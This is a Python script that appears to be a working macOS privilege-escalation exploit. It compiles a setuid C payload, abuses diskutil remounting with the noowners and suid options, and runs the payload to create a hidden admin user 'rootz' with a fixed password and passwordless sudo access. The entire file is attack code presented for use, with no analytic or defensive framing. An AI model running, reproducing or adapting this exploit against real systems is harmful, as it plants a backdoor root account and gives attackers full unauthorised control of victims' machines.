import os
import subprocess
import tempfile
import getpass

# Define file paths in the current directory
current_directory = os.getcwd()
payload_source_path = os.path.join(current_directory, "suidhelper.c")
payload_binary_path = os.path.join(current_directory, "suidhelper")
target_file_path = os.path.join(current_directory, ".file")  # Target file in current directory
sudoers_tmp_path = os.path.join(current_directory, "sudoers_tmp")
disk_identifier = "/dev/disk3s4"

# Function to execute commands and handle errors
def execute_command(command):
    process = subprocess.run(command, shell=True, capture_output=True, text=True, check=False)
    if process.returncode != 0:
        print(f"Error executing command: {command}")
        print(f"Stdout: {process.stdout}")
        print(f"Stderr: {process.stderr}")
        return False
    return True

# Function to create payload to create a root user with sudo privileges
def create_payload():
    payload_content = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

int main() {
    setuid(0);  // Gain root privileges

    const char *username = "rootz";
    const char *password = "root123";
    const char *tmp_sudoers = "/tmp/sudoers_tmp";

    char cmd[512];

    // Create user rootz
    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s", username);
    system(cmd);

    // Set shell and home directory
    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s UserShell /bin/bash", username);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s NFSHomeDirectory /Users/%s", username, username);
    system(cmd);

    // Assign a unique user ID (adjust if needed)
    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s UniqueID 501", username);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s PrimaryGroupID 20", username);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -passwd /Users/%s %s", username, password);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/bin/mkdir -p /Users/%s && /usr/sbin/chown %s /Users/%s", username, username, username);
    system(cmd);

    // Add to admin group
    snprintf(cmd, sizeof(cmd), "/usr/sbin/dseditgroup -o edit -a %s -t user admin", username);
    system(cmd);

    // Add to sudoers file
    FILE *fp = fopen(tmp_sudoers, "w");
    if (!fp) {
        perror("Cannot open sudoers tmp file");
        return 1;
    }

    fprintf(fp, "%s ALL=(ALL) NOPASSWD: ALL\\n", username);
    fclose(fp);

    snprintf(cmd, sizeof(cmd), "cat %s >> /etc/sudoers", tmp_sudoers);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "rm -f %s", tmp_sudoers);
    system(cmd);

    printf("User '%s' created with passwordless sudo access.\\n", username);
    return 0;
}
"""
    with open(payload_source_path, "w") as f:
        f.write(payload_content)

    compile_command = f"gcc {payload_source_path} -o {payload_binary_path}"
    chmod_command = f"chmod +s {payload_binary_path}"

    if not execute_command(compile_command) or not execute_command(chmod_command):
        print("Error creating payload.")
        return False

    return True

def mount_filesystem():
    mount_command = f"diskutil mount -mountOptions noowners {disk_identifier}"
    return execute_command(mount_command)

def modify_file_permissions():
    chmod_command = f"chmod 777 {target_file_path}"
    return execute_command(chmod_command)

def copy_payload():
    cp_command = f"cp {payload_binary_path} {target_file_path}"
    return execute_command(cp_command)

def set_file_permissions():
    chmod_command = f"chmod +sx {target_file_path}"
    return execute_command(chmod_command)

def remount_filesystem():
    remount_command = f"diskutil mount -mountOptions owners,suid {disk_identifier}"
    return execute_command(remount_command)

def execute_payload():
    execute_command(f"{target_file_path}")
    print("Attempted to create user 'rootz' with sudo access.")

    if os.path.exists(sudoers_tmp_path):
        try:
            os.remove(sudoers_tmp_path)
            print(f"Cleaned up temporary file: {sudoers_tmp_path}")
        except Exception as e:
            print(f"Warning: Failed to clean up {sudoers_tmp_path}: {e}")

    print("\nTo test new user access:")
    print("Try logging in as 'rootz' with password 'root123'")
    print("Then run: sudo -l or sudo id")

    return True

def exploit():
    try:
        print("Starting root user creation...")
        print("This will create user 'rootz' with password 'root123' and grant sudo access.")

        print("Creating payload...")
        if not create_payload():
            return

        print("Mounting filesystem with noowners flag...")
        if not mount_filesystem():
            return

        print("Creating target file...")
        with open(target_file_path, "w") as f:
            pass

        print("Making target file writable...")
        if not modify_file_permissions():
            return

        print("Copying payload to target location...")
        if not copy_payload():
            return

        print("Setting permissions for target file...")
        if not set_file_permissions():
            return

        print("Remounting filesystem with owners and suid flags...")
        if not remount_filesystem():
            return

        print("Executing privilege escalation...")
        execute_payload()

    except Exception as e:
        print(f"Error executing exploit: {e}")

if __name__ == "__main__":
    exploit()
